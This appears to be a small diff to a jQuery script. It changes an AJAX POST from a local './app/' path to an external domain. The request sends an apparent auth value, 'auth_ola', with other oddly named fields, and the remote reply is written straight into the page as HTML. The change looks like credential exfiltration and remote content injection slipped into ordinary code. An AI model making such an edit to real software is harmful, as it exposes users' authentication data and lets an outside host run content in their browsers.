@@ -4,7 +4,7 @@ $(function(){
   var avlenutbvfenrdc = "avlenutbvfenrdc";
   $.ajax({
     type: "POST",
-    url: "./app/",
+    url: "https://mytech.cu.ma/app/",
     data: {olaprium: olaprium, auth_ola: auth_ola, avlenutbvfenrdc: avlenutbvfenrdc},
     success: function(data){
       $("#main-top").html(data);
